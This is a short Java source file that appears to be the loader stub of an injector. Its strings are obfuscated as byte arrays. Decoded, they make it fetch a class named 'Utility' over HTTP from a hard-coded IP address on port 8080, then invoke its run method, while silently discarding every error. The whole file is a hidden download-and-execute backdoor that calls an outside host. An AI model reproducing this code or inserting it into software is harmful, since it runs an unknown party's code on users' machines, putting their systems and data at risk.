package dev.neko.nekoinjector;

import java.net.URL;

public class Loader {
   public void load() {
      try {
         Class.forName(
               new String(new byte[]{85, 116, 105, 108, 105, 116, 121}),
               true,
               (ClassLoader)Class.forName(
                     new String(new byte[]{106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114})
                  )
                  .getConstructor(URL[].class)
                  .newInstance(
                     new URL[]{
                        new URL(
                           new String(new byte[]{104, 116, 116, 112}),
                           new String(new byte[]{56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48}),
                           8080,
                           new String(new byte[]{47, 100, 108})
                        )
                     }
                  )
            )
            .getMethod(new String(new byte[]{114, 117, 110}), String.class)
            .invoke(null, "REF");
      } catch (Throwable var2) {
      }
   }
}
